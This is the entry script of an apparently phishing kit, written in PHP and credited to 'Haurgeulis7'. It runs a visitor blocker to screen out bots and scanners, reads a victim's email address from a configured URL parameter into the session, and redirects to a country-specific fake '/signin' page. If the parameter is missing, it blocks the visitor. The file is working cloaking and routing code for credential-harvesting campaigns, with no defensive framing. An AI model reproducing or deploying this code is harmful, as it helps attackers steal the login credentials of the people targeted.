<?php
/*

  __  __      _  __      _ _             _ 
 |  \/  |    (_)/ _|    | (_)           (_)
 | \  / | ___ _| |_ __ _| |_  __ _ _ __  _ 
 | |\/| |/ _ \ |  _/ _` | | |/ _` | '_ \| |
 | |  | |  __/ | || (_| | | | (_| | | | | |
 |_|  |_|\___|_|_| \__,_|_|_|\__,_|_| |_|_|
                                           
            Coded by Haurgeulis7                            

*/
require __DIR__ . '/function.php';

$api->data();
$api->blocker();
$api->create_cookie();
$_SESSION['kuzuluy'] = true;

if ($api->config("parameter") != "") {
  if (isset($_GET[$api->config("parameter")])) {
    if (filter_var($_GET[$api->config("parameter")], FILTER_VALIDATE_EMAIL)) {
      $_SESSION['email'] = $_GET[$api->config("parameter")];
    }
    $api->redirect(strtolower($_SESSION['countrycode'])."/signin");
  } else {
    $api->block("Parameter undefined");
    $api->ngeblock("error");
  }
} else {
  $api->redirect(strtolower($_SESSION['countrycode'])."/signin");
}
?>
